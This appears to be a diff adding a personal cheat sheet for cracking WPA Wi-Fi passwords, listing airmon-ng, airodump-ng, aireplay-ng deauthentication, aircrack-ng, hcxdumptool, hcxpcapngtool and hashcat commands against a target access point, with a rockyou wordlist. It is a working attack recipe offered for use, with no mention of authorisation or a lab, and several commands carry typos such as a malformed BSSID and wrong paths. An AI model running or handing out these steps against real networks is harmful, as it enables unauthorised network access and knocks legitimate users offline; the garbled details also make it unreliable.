@@ -1,0 +1,47 @@
+CRACK WIFI 
+WITH AIRCRACK-NG
+first, capture the handshake with airmon-ng
+iwxconfig
+sudo airmon-ng start wlan0
+airodump-ng wlan0mon (use your card name)
+start capturing traffi of your target AP
+airodump-ng -c 6 --bssid C0:F6:c2:5EE:8D:20 -w pass wlan0mon
+Deauthenticate the wireless clients
+aireplay-ng -O 100 -a C0:F6:c2:5EE:8D:20 wlan0mon
+look for the wpa handshake in the notification
+press ctrl+c when you have handshake
+PHASE 2
+Cracking Password
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b C0:F6:C2:5E:8D:20 pass*.cap
+(check for rockyou: locate rockyou  
+gunzip /usr/share/wordlists/rockyou.txt.gz
+aircrack-ng pass*.cap -w /user/share/wordlists/rockyou.txt
+
+aircrack-ng wpa.cap  (simple for crack wpa1 pwd)
+
+HCXDUMPTOOL
+sudo apt-get update
+sudo apt-get install hcxdumptool
+iwconfig
+stop active wifiservice
+sudo hcxdumptool -i wlan0 --do_rcascan
+ ctrl-c select the target channel and ssid
+ sudo hcxdumptool -i wlan0 -o dumpfile.pcapng -active_beacon -enable_status=15
+ dumped a pcap file in home directory
+ 
+ 
+ convert aircrack-ng and hcxdumptool handshake files to hascat files
+ sudo apt-get install hcxtools
+ hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
+ nano essidlist
+ check the bssid of our network
+ sudo hcxdumptool -i wlan0 --do_rcascan
+ get BSSID of our target network
+ 
+ convert files from aircrack ng for hashcat
+ go to https://hashcat.net/cap2hashcat/
+ 
+ now install hashcat on a powerful pc with high performance graphics card
+ https://github.com/brannondorsey/naive‐hashcat/releases/download/data/rockyou.txt
+ Open the Power shell and then use the command to crack the handshake
+ .\Hashcat.exe -m 22000 -a 0 -o cracked.txt hash.hc22000 rockyou.txt
